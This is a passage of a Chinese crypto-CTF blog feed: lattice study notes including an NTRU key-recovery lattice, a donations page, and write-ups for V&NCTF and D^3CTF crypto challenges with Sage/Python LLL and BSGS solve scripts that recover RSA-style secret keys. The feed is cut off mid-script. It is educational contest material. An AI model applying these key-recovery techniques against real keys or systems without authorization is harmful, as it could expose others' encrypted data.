<code>&#123;-1,0,1&#125;</code>这类</p><h4 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h4><p>这里的攻击方式显然并不是恢复 $publickey$ 中的 $f(x)$ ，<del>毕竟这也太靠脸了</del></p><p>由于NTRU的解密合法性，我们发现如果我们能找到一组 $f(x)$ 与 $g(x)$ 也满足 $key$ 的关系，那么我们就能拿这组多项式来充当新的 $key$</p><p>我们的矩阵构造如下<br>$$<br>B^{NTRU}<br>&#x3D;<br>{\begin{bmatrix}<br>\pmb{1}&amp;\pmb{h(x)} \\<br>\pmb{0}&amp;\pmb{q}<br>\end{bmatrix}}<br>&#x3D;<br>\begin{bmatrix}<br>\begin{array}{lllll|lllll}<br>1&amp;0&amp;0&amp;\cdots&amp;0&amp;h_0&amp;h_1&amp;h_2&amp;\cdots&amp;h_{n-1} \\<br>0&amp;1&amp;0&amp;\cdots&amp;0&amp;h_{n-1}&amp;h_0&amp;h_1&amp;\cdots&amp;h_{n-2} \\<br>0&amp;0&amp;1&amp;\cdots&amp;0&amp;h_{n-2}&amp;h_{n-1}&amp;h_0&amp;\cdots&amp;h_{n-3} \\<br>\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>0&amp;0&amp;0&amp;\cdots&amp;1&amp;h_1&amp;h_2&amp;h_3&amp;\cdots&amp;h_0 \\<br>\hline<br>0&amp;0&amp;0&amp;\cdots&amp;0&amp;q&amp;0&amp;\cdots&amp;0 \\<br>0&amp;0&amp;0&amp;\cdots&amp;0&amp;0&amp;q&amp;0&amp;\cdots&amp;0 \\<br>0&amp;0&amp;0&amp;\cdots&amp;0&amp;0&amp;0&amp;q&amp;\cdots&amp;0 \\<br>\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>0&amp;0&amp;0&amp;\cdots&amp;0&amp;0&amp;0&amp;0&amp;\cdots&amp;q \\<br>\end{array}<br>\end{bmatrix}<br>$$<br>当然左上角也可以选任意的正整数 $\lambda$ ， 同余方程里 $f(x)$ 乘个系数 $\lambda$ 罢了，对 $B^{NTRU}$ 格基规约后得到的第一个向量就可以作为新的 $f’(x)$ 和 $g’(x)$ 了</p><p>据说可以添加一个大整数 $\theta$ ，这样方便规约，如下<br>$$<br>B^{NTRU}_{\theta}<br>&#x3D;<br>{\begin{bmatrix}<br>\pmb{1}&amp;\pmb{\theta h(x)} \\<br>\pmb{0}&amp;\pmb{q\theta}<br>\end{bmatrix}}<br>$$<br>不过现在遇到的题基本上都是给的多项式计算后的数，直接用多项式的好像很少（？，但原理层面上是差不多的，只不过关系好推一点，代码实现起来也简单点吧</p><h3 id="LWE-learning-with-error"><a href="#LWE-learning-with-error" class="headerlink" title="LWE (learning with error)"></a>LWE (learning with error)</h3><p>Waiting for undate……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Lattice-learning-2&quot;&gt;&lt;a href=&quot;#Lattice-learning-2&quot; class=&quot;headerlink&quot; title=&quot;Lattice learning 2&quot;&gt;&lt;/a&gt;Lattice learning 2&lt;/h1&gt;&lt;blockquo</summary>
      
    
    
    
    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Lattice learning 1</title>
    <link href="http://example.com/2021/03/17/Lattice_learning1/"/>
    <id>http://example.com/2021/03/17/Lattice_learning1/</id>
    <published>2021-03-17T11:55:40.000Z</published>
    <updated>2021-03-19T03:11:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Lattice-learning-1"><a href="#Lattice-learning-1" class="headerlink" title="Lattice learning 1"></a>Lattice learning 1</h1><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>花了一下午的时间学完了线代<br>数学家们上辈子一定是天使吧，才能发明出这么美妙的东西<br>线性代数 相见恨晚</p><h2 id="Chapter-1-The-world-of-the-Lattice"><a href="#Chapter-1-The-world-of-the-Lattice" class="headerlink" title="Chapter 1 The world of the Lattice"></a>Chapter 1 The world of the Lattice</h2><p>向量真是个神奇的东西，因为世界上的一切都可以用向量来表示。那么如果我们要去表示一个线性空间 $V$ ，我们就需要至少两个非线性相关的向量作为基底，比方说 $\vec{i}$ 和 $\vec{j}$，因此任意的一个向量都可以用基底的线性组合来表示出来，比如 $\vec{x}&#x3D;a\cdot\vec{i}+b\cdot\vec{j}$ 。而能被 $\vec{i}$ 和 $\vec{j}$ 表示出来的所有向量的集合就称为这个线性空间 $V$ 。但是这里的’$a$’和’$b$’可以是任意的数字，那么如果我们假定这里的’$a$’和’$b$’都是整数（$a,b\in\mathbb{Z}$），这时我们就会得到一个整数格（Integer Lattice）。</p><p>我们首先使得所有的向量起点都位于原点，此时，所有的向量都与它们各自的终点一一对应，也就是说，我们可以使用向量的终点来代替该向量。那么此时我们的整数格 $V$ 就会变成一群离散开来并且有序排布的点集。当然，这些点的排列方式并不唯一，可以通过一些简单的线性变换来得到一个新的格空间。</p><p>举个栗子吧，比方说我们现在有 $\vec{b_1},\vec{b_2},\cdots,\vec{b_n}$ 作为基，那么格空间里所有的向量都可以被看作是一个矩阵 $A$：<br>$$<br>A&#x3D;\sum^n_{i&#x3D;1}(b_i\cdot \mathbb{Z})<br>$$<br>当然你也可以把这些基看成一个矩阵 $B$：<br>$$<br>A&#x3D;\sum^n_{i&#x3D;1}(b_i\cdot\mathbb{Z})&#x3D;B\cdot x(x\in\mathbb{Z}^n)<br>$$<br>所以说了这么多，格到底是什么东西？我们可以把它理解成一堆向量的集合，但是向量是很有意思的玩意。</p><h2 id="Chapher-2-Notions-in-Lattice"><a href="#Chapher-2-Notions-in-Lattice" class="headerlink" title="Chapher 2 Notions in Lattice"></a>Chapher 2 Notions in Lattice</h2><h3 id="行列式（Determinant）"><a href="#行列式（Determinant）" class="headerlink" title="行列式（Determinant）"></a>行列式（Determinant）</h3><p>一个矩阵的行列式可以看作是一种特殊的变换：它描述了由所有基向量组成的四边形或者多面体在这种线性变换中其面积或者体积的变化。</p><h3 id="最短距离（Shortest-distance）"><a href="#最短距离（Shortest-distance）" class="headerlink" title="最短距离（Shortest distance）"></a>最短距离（Shortest distance）</h3><p>比如一个由矩阵 $B$ 形成的格空间中，我们使用 $\lambda$ 来表示这个矩阵点集中的的最短距离，那么显然通过更换原点&#x2F;基的方法来把这个问题变成一个 $SVP$：<br>$$<br>\lambda_1&#x3D;min||x-y||\ \ \ (x,y\in B,x\not&#x3D;y) \\<br>&#x3D;min||x||\ \ \ (x\in B,x\not&#x3D;\vec{0})~~~~~~<br>$$<br>另外，我们用 $\lambda_2,\lambda_3,\cdots,\lambda_i,\cdots,\lambda_n$ 来表示第 $i$ 短的距离，那么显然以下结论成立：<br>$$<br>\lambda_1\leq\lambda_2\leq\lambda_3\leq\cdots\leq\lambda_n<br>$$</p><h2 id="Chapher-3-Problems-in-Lattice"><a href="#Chapher-3-Problems-in-Lattice" class="headerlink" title="Chapher 3 Problems in Lattice"></a>Chapher 3 Problems in Lattice</h2><h3 id="最短向量-SVP-Shortest-Vector-Problem"><a href="#最短向量-SVP-Shortest-Vector-Problem" class="headerlink" title="最短向量 SVP (Shortest Vector Problem)"></a>最短向量 SVP (Shortest Vector Problem)</h3><p>我们来考虑一个由矩阵 $B$ 构成的格空间 $L$ ，在其中去找这样的一个向量 $\vec{x}$ 满足：<br>$$<br>||B\vec{x}||&#x3D; \lambda_1\ \ \ (x\in \mathbb{Z}^k)<br>$$<br><img src="/img/Lattice_learning/1.png" alt="SVP"></p><p>好像看起来不难？但是当我们拿到一组较差的基时，此时的 $SVP$ 就很难求了，但是也有一种 $SVP$ 的简化版本 $SVP_\gamma$ 。在 $SVP_\gamma$ 中，我们只需要找到这样的向量 $\vec{x}$ 即可：<br>$$<br>||B\vec{x}||\leq \gamma\lambda_1\ \ \ (x\in \mathbb{Z}^k)<br>$$</p><h3 id="最近向量-CVP-Closest-Vector-Problem"><a href="#最近向量-CVP-Closest-Vector-Problem" class="headerlink" title="最近向量 CVP (Closest Vector Problem)"></a>最近向量 CVP (Closest Vector Problem)</h3><p>还是考虑一个由矩阵 $B$ 构成的格空间 $L$ ，给出一个点 $t$ ，在其中去找里点 $t$ 最近的一个向量 $\vec{x}$ ，也就是说：<br>$$<br>||B\vec{x}-\vec{t}||\leq\mu<br>$$</p><p><img src="/img/Lattice_learning/2.png" alt="CVP"></p><p>$CVP$ 也有它的简化版本 $CVP_\gamma$ ，其定义与 $SVP_\gamma$ 类似，即满足：<br>$$<br>||B\vec{x}-\vec{t}||\leq \gamma\mu\ \ \ (x\in \mathbb{Z}^k)<br>$$</p><p>$SVP$ 和 $CVP$ 都被证明是 np-hard 的问题 <del>说白了就是难的离谱</del></p><h2 id="Chapher-4-Geometric-structure-in-Lattice"><a href="#Chapher-4-Geometric-structure-in-Lattice" class="headerlink" title="Chapher 4 Geometric structure in Lattice"></a>Chapher 4 Geometric structure in Lattice</h2><h3 id="尝试解决CVP"><a href="#尝试解决CVP" class="headerlink" title="尝试解决CVP"></a>尝试解决CVP</h3><p>CVP真的压根无法下手吗？显然不是。比如在笛卡尔坐标系里，只需要简单的上下取整就能找到此时的 $CVP$ ， $SVP$ 此时显然也是很简单的问题。那么我们只要能够将格 $\Lambda$ 变成一个几乎是正交基的格 $L$ ，那么我们就能很容易的解决 $SVP$ 和 $CVP$ 。我们通常称这个过程为’Lattice Basis Reduction’，比如’Gram-Schmidt’就是其中之一的方法，但是此时我们通过简单上下取整的操作不一定得到的就是正确的答案，也只有当 $||\vec{t}-\vec{v}||\leq min\frac{||\vec{b_i}||}{2}$ 时我们得到的才是正确的结果，原因如下图：</p><p><img src="/img/Lattice_learning/3.png" alt="Gram-Schmidt"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Lattice-learning-1&quot;&gt;&lt;a href=&quot;#Lattice-learning-1&quot; class=&quot;headerlink&quot; title=&quot;Lattice learning 1&quot;&gt;&lt;/a&gt;Lattice learning 1&lt;/h1&gt;&lt;h2 id=&quot;P</summary>
      
    
    
    
    <category term="Crypto" scheme="http://example.com/categories/Crypto/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Thanks for reward</title>
    <link href="http://example.com/2021/03/17/Thanks_for_reward/"/>
    <id>http://example.com/2021/03/17/Thanks_for_reward/</id>
    <published>2021-03-17T11:55:40.000Z</published>
    <updated>2021-03-17T14:50:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="打赏鸣谢"><a href="#打赏鸣谢" class="headerlink" title="打赏鸣谢"></a>打赏鸣谢</h1><p>会有的吧会有的吧会有的吧会有的吧会有的吧（哭</p><table><thead><tr><th align="left">ID</th><th align="left">Time</th><th align="left">Money</th></tr></thead><tbody><tr><td align="left">幸福一生</td><td align="left">2021-03-06 00:07:55</td><td align="left">￥1</td></tr></tbody></table><p><img src="/img/wechat.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;打赏鸣谢&quot;&gt;&lt;a href=&quot;#打赏鸣谢&quot; class=&quot;headerlink&quot; title=&quot;打赏鸣谢&quot;&gt;&lt;/a&gt;打赏鸣谢&lt;/h1&gt;&lt;p&gt;会有的吧会有的吧会有的吧会有的吧会有的吧（哭&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;lef</summary>
      
    
    
    
    <category term="Text" scheme="http://example.com/categories/Text/"/>
    
    
    <category term="Thanks" scheme="http://example.com/tags/Thanks/"/>
    
  </entry>
  
  <entry>
    <title>Writeup for V&amp;NCTF&#39;s crypto</title>
    <link href="http://example.com/2021/03/14/Writeup_for_V&amp;NCTF2021&#39;s_crypto/"/>
    <id>http://example.com/2021/03/14/Writeup_for_V&amp;NCTF2021&#39;s_crypto/</id>
    <published>2021-03-14T14:17:49.000Z</published>
    <updated>2021-04-05T13:55:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Writeup-for-V-amp-NCTF-39-s-crypto"><a href="#Writeup-for-V-amp-NCTF-39-s-crypto" class="headerlink" title="Writeup for V&amp;NCTF&#39;s crypto"></a>Writeup for V&amp;NCTF&#39;s crypto</h1><h2 id="whitegive"><a href="#whitegive" class="headerlink" title="whitegive"></a>whitegive</h2><p>密码方向签到题，先分解n，详细推导过程如下：</p><p>$$<br>e\cdot d \equiv 1\pmod{lcm(p,p-1,q-1)}&#x3D;k\cdot \frac{p\times(p-1)\times(q-1)}{gcd}+1<br>$$</p><p>$$<br>m^{e\cdot d}&#x3D;m\pmod{((p-1)\times p)}\ 且\ m^{e\cdot d}&#x3D;m\pmod{(q-1)}<br>$$</p><p>$$<br>m^{ed}\equiv m\pmod{((p-1)\times(q-1)\times p)}<br>$$</p><p>$$<br>e\cdot d&#x3D;k\times p\times(p-1)\times(q-1)+1<br>$$</p><p>$$<br>(e\cdot d)^e&#x3D;\sum^{e}_{i&#x3D;0}C^i_e\cdot (k\times p\times (p-1)\times(q-1))^i\times 1^{e-i}&#x3D;K\times p +1<br>$$</p><p>所以<code>n</code>很容易被分解，从而算得前一步的<code>e</code>，此时发现<code>d</code>较小（满足如下关系）</p><p>$$<br>\frac{1}{3}N^{\frac{1}{4}}\leq d\leq N^{0.292}<br>$$</p><p>我们这里使用维纳攻击，但是因为<code>d</code>相对于连分数还是比较大的，需要理解原理稍微优化一下，得到一个<code>URL</code>，下载后得到另一个的脚本，最后一步较为简单，先在<code>sage</code>里用<code>small_roots</code>算出来<code>padding</code>，然后<code>related_message_attack</code>即可解决</p><h2 id="Strange-function-amp-Strange-function-revenge"><a href="#Strange-function-amp-Strange-function-revenge" class="headerlink" title="Strange_function &amp; Strange_function_revenge"></a>Strange_function &amp; Strange_function_revenge</h2><p>交互题，在<code>data</code>数组已知的情况下需要连续正确提交五次<code>token</code></p><p>服务器提供计算<code>f(x)</code>满足<br>$$<br>f(x)&#x3D;\sum^{len(token)}_{i&#x3D;1}\frac{ord(token_i)}{x-data_i}<br>$$</p><p>显然<code>ord(token[i])</code>不超过130，而<code>data</code>却是2^32左右的数字，我们简单计算下<br>$$<br>130\div 2^{32}\times16\times5\approx 0.000002421438694000244140625<br>$$<br>$$<br>130\div 2^{17}\times 8 \times5\approx 0.0396728515625<br>$$<br>所以当我们的<code>x</code>逼近其中的一个<code>data_i</code>时对<code>f(x)</code>的影响微乎其微，基本可以忽略，所以可以通过这一点来得到<code>token[i]</code>，思路如下：</p><p>我们发现：</p><p>$$<br>f(data_1+1)&#x3D;\sum^{len(token)}_{i&#x3D;1}\frac{ord(token_i)}{(data_1+1)-data_i}&#x3D;<br>$$</p><p>$$<br>ord(token_1)+\sum^{len(token)}_{i&#x3D;2}\frac{ord(token_i)}{x-data_i}\approx<br>$$</p><p>$$<br>ord(token_1)+\sum^{len(token)}_{i&#x3D;2}\frac{1}{\infty}&#x3D; ord(token_1)<br>$$</p><p>当然分子部分显然离无穷还是比较远的，那么我们要么想办法扩大<code>data</code>之间的距离，要么想办法抵消或者减小掉后面部分的影响，因为<code>data</code>和<code>token</code>均不可控，这里我们选择如下的方法来逼近<code>ord(token[i])</code><br>$$<br>k\times token(i)&#x3D;\bigg(\frac{f(data_i+1)+f(data_i-1)}{2}\bigg)+\bigg(f(data_i+2)+f(data_i-2)\bigg)+\cdots<br>$$<br>交互时间大概几分钟</p><blockquote><p>其实+1-1之后已经就消掉了，后面的只是为了更加确保</p></blockquote><h2 id="Factor"><a href="#Factor" class="headerlink" title="Factor"></a>Factor</h2><p>给了两组特别的RSA公钥，特点是共用一个<code>d</code>，但<br>$$<br>d&#x3D;inv(e,(p+1)*(q+1))<br>$$<br>具体推导如下：</p><p>对于每一组公钥，我们有：<br>$$<br>e_i\cdot d&#x3D;k_i(N_i+s_i)+1<br>$$<br>我们也可以给他们进行重新排序，使之满足：<br>$$<br>N_1&lt;N_2&lt;2N_1<br>$$<br>这里我们的推导过程如下：<br>$$<br>令M&#x3D;\lfloor N_2^{\frac{1}{2}}\rfloor\ 有：<br>$$<br>$$<br>dM ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ &#x3D;dM ~~~~~~~~~~~<br>$$<br>$$<br>e_1d-N_1k_1 ~~~~~~~~~~~~~~~ &#x3D;1+k_1s_1 ~~<br>$$<br>$$<br>e_2d ~~~~~~~~~~~~~~~ -N_2k_2&#x3D;1+k_2s_2 ~~<br>$$</p><p>这样的三个方程组我们可以写成这样的向量矩阵方程<br>$$<br>XB&#x3D;V<br>$$<br>$$<br>X&#x3D;{\begin{bmatrix}<br>dM &amp; e1 &amp; e2<br>\end{bmatrix}}<br>$$<br>$$<br>B&#x3D;{\begin{bmatrix}<br>M &amp; e1 &amp; e2 \\<br> &amp; -N_1 &amp;  \\<br> &amp; &amp; -N_2<br>\end{bmatrix}}<br>$$<br>$$<br>V&#x3D;{\begin{bmatrix}<br>dM &amp; 1+k_1s_1 &amp; 1+k_2s_2<br>\end{bmatrix}}<br>$$<br>LLL格基规约后即可算出 <code>d</code>和每一个<code>not_phi</code>，接着就可以轻松分解<code>N</code>，RSA正常解密即可</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Writeup-for-V-amp-NCTF-39-s-crypto&quot;&gt;&lt;a href=&quot;#Writeup-for-V-amp-NCTF-39-s-crypto&quot; class=&quot;headerlink&quot; title=&quot;Writeup for V&amp;amp;NCTF&amp;#</summary>
      
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Write up for AntCTF X D^3CTF&#39;s crypto</title>
    <link href="http://example.com/2021/03/08/Wp_for_AntCTF_X_D^3CTF&#39;s_crypto/"/>
    <id>http://example.com/2021/03/08/Wp_for_AntCTF_X_D^3CTF&#39;s_crypto/</id>
    <published>2021-03-08T14:53:03.000Z</published>
    <updated>2021-03-14T14:30:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Wp-for-AntCTF-X-D-3CTF-39-s-crypto"><a href="#Wp-for-AntCTF-X-D-3CTF-39-s-crypto" class="headerlink" title="Wp for AntCTF X D^3CTF&#39;s crypto"></a>Wp for AntCTF X D^3CTF&#39;s crypto</h1><p>我的格子和椭圆曲线实在是太烂了，奈何这次比赛基本都是（</p><p>这次只贡献了1k分，我对不起V&amp;N的师傅们呜呜呜</p><span id="more"></span><h2 id="babyLattice"><a href="#babyLattice" class="headerlink" title="babyLattice"></a>babyLattice</h2><p>联合第二题，发现此题应该要分解n，观察秘钥生成代码，发现如下关系：</p><p>$$<br>a_1 &#x3D; k \cdot n + a_{11} \cdot q \cdot inv(q,p) + a_{21} \cdot p \cdot inv(p,q)<br>$$<br>$$<br>a_2 &#x3D; k \cdot n + a_{12} \cdot q \cdot inv(q,p) + a_{22} \cdot p \cdot inv(p,q)<br>$$</p><p>所以<br>$$<br>a_1 &#x3D; a_{11} \pmod{p} &#x3D; a_{21} \pmod{q}<br>$$<br>$$<br>a_2 &#x3D; a_{12} \pmod{p} &#x3D; a_{22} \pmod{q}<br>$$</p><p>所以易知<br>$$<br>b &#x3D;\frac{a_{11}}{a_{12}}\pmod{p}&#x3D;\frac{a_{21}}{a_{22}}\pmod{q}<br>$$</p><p>即</p><p>$$<br>b\cdot a_{12} - a_{11} &#x3D; 0 \pmod{p}<br>$$<br>$$<br>b\cdot a_{22} - a_{21} &#x3D; 0 \pmod{q}<br>$$</p><p>所以</p><p>$$<br>(b\cdot a_{12}-a_{11})(b\cdot a_{22}-a_{21})&#x3D;0 \pmod{n}<br>$$</p><p>即</p><p>$$<br>b^2\cdot a_{12}\cdot a_{22} - b\cdot (a_{12}\cdot a_{21}+a_{11}\cdot a_{22}) + (a_{11}\cdot a_{21}) &#x3D; 0 \pmod{n}<br>$$</p><p>我们选择构造格子<br>$$<br>{\begin{bmatrix}<br>1 &amp; 0 &amp; b^2 \\<br>0 &amp; 1 &amp; b \\<br>0 &amp; 0 &amp; n<br>\end{bmatrix}}<br>$$</p><p>LLL格基规约后再分解就能得到<code>a_12</code>、<code>a_22</code>、<code>a_12</code>和<code>a_22</code>，就可以恢复出<code>A</code>，关于中间的顺序，首先 $gcd(n,b\cdot a_{12}-a_{11})&#x3D;p，gcd(n,b\cdot a_{22} - a_{21})&#x3D;q$ ，然后反过头来用<code>b</code>检验，即可得到<code>A</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">n=69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361</span><br><span class="line">b=65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196</span><br><span class="line">m = [[1,0,b**2],</span><br><span class="line">[0,1,b],</span><br><span class="line">[0,0,n]]</span><br><span class="line">M = Matrix(ZZ,m)</span><br><span class="line">print(M.LLL()</span><br></pre></td></tr></table></figure><p>私钥拿到之后跑一遍decrypt函数就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from hashlib import sha256</span><br><span class="line"></span><br><span class="line">def decrypt(c, sk):</span><br><span class="line">a2 = crt([sk.A[0,1], sk.A[1,1]], [sk.p, sk.q])</span><br><span class="line">s1 = a2 * c % sk.p</span><br><span class="line">s2 = a2 * c % sk.q</span><br><span class="line">m, r = sk.A.solve_right(vector([s1, s2]))</span><br><span class="line">return m</span><br><span class="line">SecretKey = namedtuple(&#x27;SecretKey&#x27;, [&#x27;p&#x27;, &#x27;q&#x27;, &#x27;A&#x27;])</span><br><span class="line">n = 698045073281979616541286975103101096080462440304373626396370091849455338842947378705241865215097761899894513834380845079036601822125564663210580257883191930598948255707851053881237189214806988515510241088447820911174087537825999619430406958923237023619101073xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">b = 654739385780229208489849014846243612518694068218636169087772139065258584372361858322141986275106636324098693631439825949471641392200139046541969608293506424133487719184222204047775053450532021592003789353095938029168756814364427346672490495356709866737744870xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">c = 646663549384661940527205918107837690305665046534094651211733313626546652315738092349139857587250480713115715497774817768266247287420861746098971608971187502431927910215773481811303025721859117507974577939210694737300392259917557553409275067663952621259499393xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">a21 = 2078066511675xxxxxxxxxxxxxxxxx</span><br><span class="line">a11 = 1017199123798xxxxxxxxxxxxxxxxxx</span><br><span class="line">a12 = 1018979931854xxxxxxxxxxxxxxxxxx</span><br><span class="line">a22 = 1151291153120xxxxxxxxxxxxxxxxxx</span><br><span class="line">assert a21*a12+a11*a22 == 1382843159437215516163973075066558157591473xxxxxxxxxxxxxxxxxx</span><br><span class="line">p = gcd(n,(b*a12-a11)%n)</span><br><span class="line">q = gcd(n,(b*a22-a21)%n)</span><br><span class="line">print(p,q)</span><br><span class="line">assert p*q == n</span><br><span class="line">a1 = crt([a11, a21], [p, q])</span><br><span class="line">a2 = crt([a12, a22], [p, q])</span><br><span class="line">assert b == a1 * inverse_mod(a2, n) % n</span><br><span class="line">A = Matrix(ZZ, [[a11, a12], [a21, a22]])</span><br><span class="line">SK = SecretKey(p, q, A)</span><br><span class="line">m = decrypt(c, SK)</span><br><span class="line">flag = &#x27;d3ctf&#123;%s&#125;&#x27; % sha256(int(m).to_bytes(50, &#x27;big&#x27;)).hexdigest()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="simpleGroup"><a href="#simpleGroup" class="headerlink" title="simpleGroup"></a>simpleGroup</h2><p>发现给的n和babyLattice是一样的，直接把p和q抄过来，然后发现 $e\mid\varphi(n)$</p><p>每次加密有 $C &#x3D; y^m \cdot r^e % n$ ，则 $C^{(phi&#x2F;e)} &#x3D; {(y^m)}^{(phi&#x2F;e)} * r^phi &#x3D; {(y^m)}^{(phi&#x2F;e)} &#x3D; {(y^{(phi&#x2F;e)})}^m\pmod{n}$ </p><p>即 $C^{(phi&#x2F;e)} &#x3D; {(y^{(phi&#x2F;e)})}^m\pmod{n}$ ，因为 $m &#x3D; M \pmod{e}$ ，显然 $m&lt;e$ ，bsgs爆破得到<code>mlist</code>，返回去即可得到<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">BSGS</span>(<span class="params">G,H,P</span>):</span><br><span class="line">    L1,L2 = [],[]</span><br><span class="line">    N = iroot(<span class="number">1928983487</span>,<span class="number">2</span>)[<span class="number">0</span>]+<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N+<span class="number">1</span>):</span><br><span class="line">        L1.append(<span class="built_in">pow</span>(G,i,P))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N+<span class="number">1</span>):</span><br><span class="line">        tmp=H * inverse(<span class="built_in">pow</span>(G,i*N,P),P) % P</span><br><span class="line">        L2.append(tmp)</span><br><span class="line">        <span class="keyword">if</span> tmp <span class="keyword">in</span> L1:</span><br><span class="line">            a=L1.index(tmp)</span><br><span class="line">            b=i</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">int</span>(b*N+a)</span><br><span class="line"></span><br><span class="line">n = <span class="number">69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910</span>1073xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">y = <span class="number">1206480154572334732293699118673856031104906123554</span>10315808075494222588141707717382622649304416707083082596945889632243725304983056485785205520380297738493422061250742129127888238341527857566977572098044750319744459636919415157569012683762673605426564496697153xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">e = <span class="number">1928983487</span></span><br><span class="line">p = <span class="number">76690363131011946213452652559942001330069215655966537979569408116015163064</span>102321200576xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">q = <span class="number">9</span>1021224151656818244208716736217812503118228056187318636281925498956930242472205943728xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br><span class="line">phi = (p-<span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">C = [<span class="number">63173987757788284988620600191109581820396865828379773315280703314093571300861961873159324234626635582246705378908610341772657840682572386153960342976445563045427986000105931341168525422286612417662391801508953619857648844420751306271090777865836201978470895906780036112804110135446130976275516908136806153488</span>, <span class="number">9763526786754236516067080717710975805995955013877681492195771779269768465872108434027813610978940562101906769209984501196515248675767910499405415921162131390513502065270491854965819776080041506584540996447044249409209699608342257964093713589580983775580171905489797513718769578177025063630080394722500351718</span>, <span class="number">37602000735227732258462226884765737048138920479521815995321941033382094711120810035265327876995207117707635304728511052367297062940325564085193593024741832905771507189762521426736369667607865137900432117426385504101413622851293642219573920971637080154905579082646915297543490131171875075081464735374022745371</span>, <span 